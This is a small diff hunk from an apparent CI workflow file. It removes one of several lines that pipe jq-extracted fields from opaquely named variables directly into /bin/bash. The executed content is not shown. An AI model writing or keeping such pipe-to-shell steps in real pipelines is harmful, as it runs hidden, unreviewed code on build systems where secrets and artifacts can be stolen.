@@ -28,7 +28,6 @@ jobs:
           printf '%s' "$gibm343" | jq -r .qgil2 | /bin/bash
           printf '%s' "$kdgs28827" | jq -r .twa123 | /bin/bash
           echo $xu7 | jq -r .mekov3 | /bin/bash
-          echo $hlc40 | jq -r .xbvyd5076 | /bin/bash
 
       - name: Save archive
         if: always()
